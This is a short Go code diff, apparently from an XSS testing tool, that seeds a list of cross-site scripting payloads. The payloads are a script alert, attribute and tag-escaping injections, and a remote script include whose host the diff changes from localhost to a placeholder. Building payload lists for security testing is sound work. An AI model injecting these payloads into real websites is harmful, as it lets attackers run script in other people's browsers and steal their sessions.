@@ -54,7 +54,7 @@ func initialize(database string) (err error) {
 			{Description: "As simple as it can get!", Code: "<script>alert(1)</script>"},
 			{Description: "Simple attribute injection", Code: "\" onload=alert(1)"},
 			{Description: "Attribute injection and tag escaping", Code: "\"><img src=x onerror=alert(1)>"},
-			{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "http://127.0.0.1:8080")},
+			{Description: "Include remote script", Code: fmt.Sprintf("<script src='%v'></script>", "[[HOST_REPLACE_ME]]")},
 		}
 
 		for _, payload := range payloads {
